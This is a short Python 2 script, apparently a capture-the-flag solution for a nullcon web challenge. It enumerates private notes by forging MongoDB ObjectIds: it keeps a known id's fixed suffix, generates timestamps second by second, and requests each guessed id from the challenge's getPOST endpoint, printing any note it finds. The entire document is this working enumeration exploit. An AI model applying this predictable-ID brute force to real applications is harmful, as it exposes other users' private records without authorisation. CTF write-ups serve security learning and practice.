from bson import ObjectId
import datetime
import requests

api = "http://web6.ctf.nullcon.net:4545/getPOST?id="
r =requests.session()
given="5c51b9c9144f813f31a4c0e2"
timestamp = given[0:8]
static = given[8:]
change = static[-2:]
static_again = static[:-2]

# Only going downwards as of now
idz = ['df','e0','e1','e2']


hr = 14
minz = 45
sec = 01
counter=0

for i in xrange(0,10000):
	if sec%60 == 0:
		sec=0
		minz+=1
	gen_time = gen_time=datetime.datetime(2019, 1, 30, hr, minz, sec)
	print gen_time
	dummy = ObjectId.from_datetime(gen_time)
	new_ts = str(dummy)[0:8]
	final = new_ts+static_again+idz[counter]
	r1 = r.get(api+final)
	print final
	if 'error' in r1.text:
		print "nope"
		sec=sec+1
		continue
	else:
		sec=sec+1
		print "[+] Found Note at"+final
		print r1.text
		counter=counter+1
